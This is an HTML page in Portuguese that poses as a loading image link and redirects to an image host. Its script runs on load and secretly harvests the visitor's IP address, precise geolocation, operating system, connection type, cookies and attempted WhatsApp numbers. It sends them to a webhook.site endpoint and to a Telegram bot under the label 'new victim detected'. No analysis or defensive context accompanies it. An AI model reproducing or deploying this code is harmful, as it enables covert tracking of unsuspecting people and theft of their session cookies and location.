<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Carregando...</title>
  <style>
    body { margin: 0; background: #000; }
    img { width: 100vw; height: 100vh; object-fit: cover; }
  </style>
</head>
<body>
  <script>
    // Redirecionar para a URL da imagem
    window.location.replace("https://ibb.co/35Db3PWf");

    const inicio = Date.now();
    let tentouSair = false;

    document.addEventListener("mouseout", e => {
      if (e.clientY < 0) tentouSair = true;
    });

    // Função para pegar o IP público
    async function getIP() {
      const response = await fetch("https://api.ipify.org?format=json");
      const data = await response.json();
      return data.ip || "Desconhecido";
    }

    // Função para pegar a geolocalização precisa
    function getExactLocation() {
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(position => {
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            });
          }, reject);
        } else {
          reject("Geolocalização não disponível.");
        }
      });
    }

    // Função para pegar a operadora de rede
    function getCarrier() {
      const carrier = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      return carrier ? carrier.effectiveType : "Desconhecido";
    }

    // Função para pegar dados do WhatsApp
    function getWhatsAppNumber() {
      const numbers = [];
      const iframe = document.querySelector('iframe[src*="web.whatsapp.com"]');
      if (iframe) {
        try {
          const iframeWindow = iframe.contentWindow;
          const contacts = iframeWindow.document.querySelectorAll('.two');
          contacts.forEach(contact => {
            const number = contact.getAttribute('data-number');
            if (number) {
              numbers.push(number);
            }
          });
        } catch (error) {
          console.error('Erro ao pegar número do WhatsApp:', error);
        }
      }
      return numbers.join(', ') || "Não disponível";
    }

    // Função para pegar cookies
    function getCookies() {
      return document.cookie || "Não disponível";
    }

    // Função para pegar o sistema operacional
    function getOS() {
      const userAgent = navigator.userAgent;
      if (userAgent.indexOf("Win") != -1) return "Windows";
      if (userAgent.indexOf("Mac") != -1) return "MacOS";
      if (userAgent.indexOf("X11") != -1) return "UNIX";
      if (userAgent.indexOf("Linux") != -1) return "Linux";
      return "Desconhecido";
    }

    // Função para coletar dados e enviar para Webhook e Telegram
    async function collectData() {
      const ip = await getIP();
      const location = await getExactLocation().catch(() => ({ latitude: "N/A", longitude: "N/A" }));
      
      const data = {
        ip: ip,
        latitude: location.latitude,
        longitude: location.longitude,
        carrier: getCarrier(),
        sistema: getOS(),
        whatsappNumber: getWhatsAppNumber(),
        cookies: getCookies(),
        tempoNaPagina: `${Math.floor((Date.now() - inicio) / 1000)}s`,
        tentouSair: tentouSair ? "Sim" : "Não"
      };

      // Enviar para o Webhook.site
      fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      // Enviar para o Telegram
      fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: 94845670,
          text: `
🧠 *Nova vítima detectada*

IP: ${data.ip}
Localização: ${data.latitude}, ${data.longitude}
Operadora: ${data.carrier}

Sistema: ${data.sistema}
WhatsApp Número: ${data.whatsappNumber}
Cookies: ${data.cookies}
Tempo na página: ${data.tempoNaPagina}
Tentou sair: ${data.tentouSair}
          `.trim()
        })
      });
    }

    collectData();
  </script>
</body>
</html>
